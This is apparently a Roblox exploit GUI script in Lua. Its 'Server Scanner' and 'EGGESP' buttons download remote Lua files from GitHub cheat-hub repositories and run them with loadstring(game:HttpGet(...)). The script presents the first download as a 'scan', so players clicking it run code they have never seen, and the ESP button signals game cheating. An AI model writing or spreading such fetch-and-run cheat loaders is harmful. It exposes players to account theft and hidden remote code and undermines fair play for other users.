-- Scripts:

-- Play Raining Tacos music when GUI loads
task.spawn(function()
    wait(1)  -- Short delay to ensure GUI is loaded
    rainingTacos:Play()
    print("Now playing: Raining Tacos on infinite loop!")
end)

local function BODO_fake_script() -- ServerScanner.LocalScript 
	local script = Instance.new('LocalScript', ServerScanner)

	-- Place this LocalScript inside your 'Server Scanner' TextButton
	local button = script.Parent
	local mainFrame = button.Parent.Parent -- Goes up to ScrollingFrame then to MainFrame
	local debounce = false
	
	button.MouseButton1Click:Connect(function()
		if debounce then return end
		debounce = true
	
		-- Visual feedback
		local originalText = button.Text
		local originalColor = button.BackgroundColor3
	
		button.Text = "SCANNING..."
		button.BackgroundColor3 = Color3.fromRGB(0, 100, 200) -- Blue during scan
	
		-- Execute the external script with error handling
		local success, err = pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250621_fb7786.lua"))()
		end)
	
		-- Results handling
		if success then
			button.Text = "SCANNING!"
			if mainFrame:FindFirstChild("ScanResults") then
				mainFrame.ScanResults.Text = "External script executed successfully"
			end
		else
			button.Text = "SCAN FAILED!"
			if mainFrame:FindFirstChild("ScanResults") then
				mainFrame.ScanResults.Text = "Error: "..tostring(err):sub(1, 100)
			end
			warn("ServerScanner Error:", err)
		end
	
		-- Reset after 2 seconds
		task.wait(2)
		button.Text = originalText
		button.BackgroundColor3 = originalColor
		debounce = false
	end)
end
coroutine.wrap(BODO_fake_script)()
local function OBEVPM_fake_script() -- SeedPack.ToggleWarningFrame 
	local script = Instance.new('LocalScript', SeedPack)

	local seedpackButton = script.Parent
	local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	local screenGui = playerGui:WaitForChild("ScreenGui")
	local frame = screenGui:WaitForChild("Frame")
	local warningFrame = frame:WaitForChild("WARNING")
	
	seedpackButton.MouseButton1Click:Connect(function()
		warningFrame.Visible = true
	end)
end
coroutine.wrap(OBEVPM_fake_script)()
local function DDEW_fake_script() -- EGGESP.LocalScript 
	local script = Instance.new('LocalScript', EGGESP)

	-- Place this LocalScript inside your 'Server Scanner' TextButton
	local button = script.Parent
	local mainFrame = button.Parent.Parent -- Goes up to ScrollingFrame then to MainFrame
	local debounce = false
	
	button.MouseButton1Click:Connect(function()
		if debounce then return end
		debounce = true
	
		-- Visual feedback
		local originalText = button.Text
		local originalColor = button.BackgroundColor3
	
		button.Text = "EXECUTING..."
		button.BackgroundColor3 = Color3.fromRGB(0, 100, 200) -- Blue during scan
	
		-- Execute the external script with error handling
		local success, err = pcall(function()
			loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
		end)
	
		-- Results handling
		if success then
			button.Text = "EXECUTED!"
			if mainFrame:FindFirstChild("ScanResults") then
				mainFrame.ScanResults.Text = "External script executed successfully"
			end
		else
			button.Text = "EXECUTION FAILED!"
			if mainFrame:FindFirstChild("ScanResults") then
				mainFrame.ScanResults.Text = "Error: "..tostring(err):sub(1, 100)
			end
			warn("ServerScanner Error:", err)
		end
	
		-- Reset after 2 seconds
		task.wait(2)
		button.Text = originalText
		button.BackgroundColor3 = originalColor
		debounce = false
	end)
end
coroutine.wrap(DDEW_fake_script)()
